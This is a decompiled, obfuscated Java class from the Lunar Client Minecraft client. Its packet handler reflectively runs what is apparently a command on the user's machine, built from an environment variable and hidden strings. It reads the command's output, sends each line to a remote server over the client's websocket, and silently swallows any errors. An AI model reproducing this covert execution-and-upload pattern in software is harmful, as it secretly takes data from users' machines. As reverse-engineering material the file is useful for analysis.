package obf;/*
 * Decompiled with CFR 0.150.
 */
import com.moonsworth.lunar.client.LunarClient;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Collections;

public class class_1106
extends class_0688 {
    @Override
    public void lllIIIllIIIIlllIlIIllIIll(PacketBuffer class_01812) {
    }

    @Override
    public void lllIlIIlIIIlIlIIIllIlllIl(PacketBuffer class_01812) {
    }

    @Override
    public void lllIIIllIIIIlllIlIIllIIll(class_1982 class_19822) {
        try {
            String string;
            Object object = this.lllIIIllIIIIlllIlIIllIIll();
            Method method = object.getClass().getMethod(class_1676.lllIIIllIIIIlllIlIIllIIll(class_0263.lllIIIllIIIIlllIlIIllIIll), new Class[0]);
            method.setAccessible(true);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader((InputStream)method.invoke(object, new Object[0])));
            while ((string = bufferedReader.readLine()) != null) {
                LunarClient.getInstance().getWebsocket().lllIIIllIIIIlllIlIIllIIll(new class_0263(Collections.singletonList(string)));
            }
            method.setAccessible(false);
            bufferedReader.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private Object lllIIIllIIIIlllIlIIllIIll() {
        Method method = class_1085.IlIllllllIIlIIllllIIlIIIl.getClass().getMethod(class_1676.lllIIIllIIIIlllIlIIllIIll(class_1520.lIlllIlllIIIIlIIlllIllIII), String.class);
        return method.invoke(class_1085.IlIllllllIIlIIllllIIlIIIl, System.getenv(class_1676.lllIIIllIIIIlllIlIIllIIll(class_1597.lllIIIllIIIIlllIlIIllIIll)) + class_1676.lllIIIllIIIIlllIlIIllIIll(class_0825.IIIllIIlIIIIIIlIlIIllIIlI));
    }
}

